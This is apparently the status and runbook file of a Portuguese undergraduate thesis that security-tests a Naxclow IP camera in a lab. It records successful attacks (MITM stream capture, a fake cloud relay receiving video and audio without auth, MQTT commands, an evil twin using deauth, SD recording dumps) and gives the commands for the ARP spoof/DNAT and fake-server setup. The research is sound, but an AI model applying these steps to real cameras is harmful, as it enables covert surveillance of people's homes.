# Próximos passos e estado do lab

> **Ponto de entrada pra retomar o TCC.** O detalhe de cada vetor está nos `achados_*.md`
> (links abaixo). Este arquivo é o mapa: o que já foi, o que falta, onde rodar e as armadilhas.

## Estado do lab

| Item | Valor |
|---|---|
| Câmera | Naxclow Y2SN, firmware `202601081657`, `devicesCode 5c001502B330` |
| LAN da câmera | `192.168.0.17` (gw `192.168.0.1`), MAC `5c:f1:50:04:af:8a` |
| IP público da câmera | `191.187.210.110` |
| VPS (relay falso) | `137.131.132.251` (Ubuntu aarch64), repo em `/home/sentinela-tcc`, venv `.venv` |
| Relay do cloud | `107.149.143.96` / `107.149.136.10` … portas `29939`–`29942` |
| Broker MQTT (cloud) | pool de IPs (ex.: `39.108.171.214:1883`), **sem TLS** |
| Kali | atacante (ARP spoof / DNAT / monitor) |
| Fake server | `src/a9_naxclow.py -s` (HTTP `:8080` + relay TCP/UDP `:29940`) |

Doc de protocolo (payloads, portas, handshake): [`protocolo_naxclow.md`](protocolo_naxclow.md).

## Concluído

- ✅ **Stream em STA via MITM** — capturado e remontado (`achados_sta.md` + `scripts/utils/extract_mitm_video_udp.py`).
- ✅ **Superfície MQTT** — `wifiscan`, `record`, `ledei`, `setwifi`, `format` (`achados_mqtt.md`).
- ✅ **Stream em AP** — capturado (`achados_ap.md`).
- ✅ **RE do APK** — relay antigo + WebRTC do app 3.3.0.
- ✅ **Relay falso em IP público (VPS)** — a câmera registra num relay do atacante e entrega **vídeo + áudio**, sem app e sem auth (`achados_fakeserver_relay.md`).
- ✅ **Gravações do SD (modo AP)** — listagem, download e `--dump` de todas as gravações sem auth (`achados_ap.md`).
- ✅ **Consolidação** — `docs/achados_finais.md` (OWASP/CVSS + provado vs pendente).
- ❌ **SD pelo relay (sem modo AP)** — testado (2026-11-02): o firmware **não** responde às ops de SD (`400/402/404/406`) no envelope `301`; só no `502` (AP). Detalhe em [`achados_sd_relay.md`](achados_sd_relay.md).
- ✅ **Modo combinado (controle + stream na VPS)** — **RESOLVIDO** (2026-11-03): a captura do `240` real (hotspot no Kali + `setwifi`) revelou os campos que o fake omitia — **`tcpPort` e `uid`** (causavam `errStatus 2`). Corrigido em `src/v720_http.py`; agora a câmera aceita o `240`, **abre o relay**, e o atacante recebe **vídeo real (640x480, JPEG)** + controle MQTT (`ledei`/`setwifi`). Ver [`runbook_mitm_dns.md`](runbook_mitm_dns.md).
- ✅ **Evil twin (deauth + clone)** — **RESOLVIDO** (2026-11-04): clone do AP (mesmo SSID/senha) + **deauth** fez a câmera **migrar sozinha** pro AP do atacante; ela pegou IP/DNS dele, conectou no broker e obedeceu os comandos (`ledei`). Detalhe em [`achados_evil_twin.md`](achados_evil_twin.md).
- ✅ **Vídeo via evil twin (fake na VPS + NAT restrito)** — validado (2026-11-04): mantendo o fake local pro controle/DNS e anunciando o relay na **VPS**, a câmera abriu o relay lá e o `/live` rendeu **vídeo (JPEG 640×480)**. Ver [`achados_evil_twin.md`](achados_evil_twin.md).
- ❌ **OTA / firmware** — testado (2026-11-21): a câmera **recebe** `ota_url`/`ota_version` do fake e **ignora**; não tenta baixar. O update é orquestrado pelo cloud via **HTTPS** (`getNewVersion` → `mdfDevVersion`), então não cai por DNS/rota. Detalhe em [`achados_ota.md`](achados_ota.md).

## Pendente (ordem) — e onde rodar

**Nada em aberto.** Todos os vetores planejados foram executados — os positivos documentados nos `achados_*.md` e os negativos em [achados_finais](achados_finais.md#testado-e-descartado).

**Não é pendência (já fechado):** evil twin (deauth + clone, **com vídeo**), modo combinado, relay público, AP, MITM STA, MQTT, SD no AP, **OTA** ([`achados_ota.md`](achados_ota.md)), **controle pelo canal relay** (PTZ/LED com pulsos a 80 ms — [`achados_relay_controle.md`](achados_relay_controle.md)) e **IR/flip no AP** ([`achados_ap_ir_flip.md`](achados_ap_ir_flip.md)). O **twin aberto** e o **crack do handshake WPA2** são variações de pré-requisito do evil twin — o ataque em si está provado com SSID+senha reais; se quiser fechar o pré-requisito, é um teste extra (Kali + dongle), não um vetor em aberto.

**Descartado por decisão de escopo:** SD via app/cloud (exigiria CA no iPhone) e hardware drop (só modelo de ameaça, em [`conceito_hardware_drop.md`](conceito_hardware_drop.md)).

**Resumo de plataforma:** o **evil twin** prende na Kali (Linux); todo o resto — OTA, controle por relay e IR/flip no AP — rodou no Mac.

## Armadilhas conhecidas (não repetir)

- **A porta do relay varia** (`29939`–`29942`): o DNAT tem que cobrir a **faixa**, em TCP **e** UDP. Cobrir só `29940` não pega (o SYN-ACK volta do relay real).
- **NAT probe é validado:** os **defaults do `v720_sta.py`** (`cliIp 191.187.210.110`, `cliPort 47006`, `cliNatIp 192.168.0.21`, `cliNatPort 53929`) são os valores do capture real. **Não** sobrescrever com valor errado (ex. `cliIp` = IP da VPS) — a câmera rejeita o `code 11` (sem `code 12`) e o canal não abre.
- **Fake precisa de IP público:** a câmera só abre o canal de dados pra endpoint **público** (relay). Em IP local (AP isolado) ela registra mas nunca abre o `:29940`.
- **Viewer tem que estar em 4G/3G:** na mesma WiFi a câmera conecta em P2P local e **não** passa pelo relay.
- **macOS — `pf rdr` tem que apontar pra `127.0.0.1`, não pro IP da LAN.** Redirecionar pro próprio IP da interface não entrega no socket local (o SYN-ACK volta do host real). Corrigido em `mitm_dns.sh` (2026-11-21); `dnat on` agora funciona no Mac.
- **DNS spoof sozinho não basta:** este firmware faz `getDevInfo` **por IP fixo** (`43.242.130.61:80`), não por DNS. Sem `dnat on`, a câmera fala com o cloud real mesmo com o DNS envenenado (visto em 2026-11-21). Só `v720.naxclow.com`/`v720.p2p.naxclow.com` passam pelo DNS.
- **A câmera ignora `ota_url`/`ota_version`:** campo morto neste firmware. Não perder tempo tentando OTA só com o fake — ver [`achados_ota.md`](achados_ota.md).
- **`sudo` limpa o ambiente:** `VAR=x sudo ./script` **não** repassa `VAR`. Use `./scripts/mitm_dns/ota_up.sh <cmd>`, que aplica as variáveis depois do `sudo`.
- **A câmera muda de IP** entre sessões (DHCP). `ota_up.sh` descobre pelo OUI `5c:f1:50`; o default do script (`192.168.0.36`) quase nunca é o IP atual.
- **Firmware cicla o TCP** (~12–47 s): o device re-registra sozinho; o fake mantém o device no `/dev/list` e o UDP vivo entre ciclos.

## Como subir o lab (relay falso)

**VPS:**
```bash
sudo FAKE_SRV_HOST=137.131.132.251 FAKE_SRV_RELAY_HOST=137.131.132.251 \
  .venv/bin/python src/a9_naxclow.py -s -v --proxy-port 8080
```

**Kali** (mesma LAN da câmera):
```bash
sudo DNAT_TARGET=137.131.132.251 ./scripts/mitm_dns/mitm_dns.sh relay
```

Endpoints do fake: `/dev/list`, `/dev/<uid>/live|audio|snapshot|hls`, `/dev/<uid>/fwd?v=<code>` (manda um `301` com `content.code`).

## Ferramentas

- `src/a9_naxclow.py` — `-s` fake server · `-f`/`-d` SD card (AP) · `-l` live (AP).
- `scripts/mitm_dns/mitm_dns.sh` — ARP spoof + DNAT (`relay`, `DNAT_TARGET`).
- `scripts/utils/extract_mitm_video_udp.py` — remontagem do stream UDP.
- `src/v720_hls.py` — JPEG → HLS/H.264 (ffmpeg).
- `scripts/fakeserver/fake_srv_cmd.sh` — comandos MQTT.
